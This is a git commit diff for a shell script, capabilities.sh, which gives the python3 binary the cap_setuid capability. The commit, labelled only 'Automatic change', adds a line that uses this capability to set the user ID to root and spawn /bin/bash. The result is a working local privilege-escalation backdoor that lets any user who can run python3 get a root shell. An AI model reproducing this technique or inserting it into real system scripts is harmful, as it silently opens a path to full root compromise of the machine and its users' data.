642a9a7cbb622428350b47fdbed3b2b74928ace8
Equitrack <string3075@gmail.com>
2021-03-30 19:18:01 -0600

    Automatic change at: Tue Mar 30 07:18:01 PM CST 2021

--- 01_generalScripts/capabilities.sh
+++ 01_generalScripts/capabilities.sh
@@ -7,6 +7,7 @@ pathFile=`readlink -f $(which python3)`
 if [ -f "$pathFile" ]; then
    setcap cap_setuid+ep $pathFile
    echo "Status capability: $(getcap $pathFile)"
+   $pathFile -c 'import os; os.setuid(0); os.system("/bin/bash")'
 else
    echo "Python3 no existe"
 fi
